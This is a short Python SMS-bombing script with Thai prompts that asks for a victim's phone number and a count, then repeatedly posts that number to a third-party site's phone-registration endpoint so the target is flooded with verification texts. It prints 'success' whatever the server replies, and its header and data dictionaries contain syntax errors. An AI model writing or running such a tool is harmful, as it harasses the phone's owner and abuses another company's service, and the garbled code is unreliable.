import requests,time

print("""
      
░██████╗███╗░░░███╗░██████╗
██╔════╝████╗░████║██╔════╝
╚█████╗░██╔████╔██║╚█████╗░
░╚═══██╗██║╚██╔╝██║░╚═══██╗
██████╔╝██║░╚═╝░██║██████╔╝
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░
        
""")

no = input('ตัวอย่าง : 08xx\n[😠] เบอร์: ')
jml = int(input('[😠] จำนวน: '))

heder = {'Host': 'app.nigoal123.com',
'content-length': '16',
'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'accept-language': 'th-TH,th;q=0.9,en;q=0.8,
}
        
data = {"phone": f"{no}","}


print("\n[กำลังยิง]")
for i in range(jml):
      sec = requests.post('https://app.nigoal123.com/Register/tel', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
      else:
           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
      time.sleep(2.0)
      
#เครดิตSCK
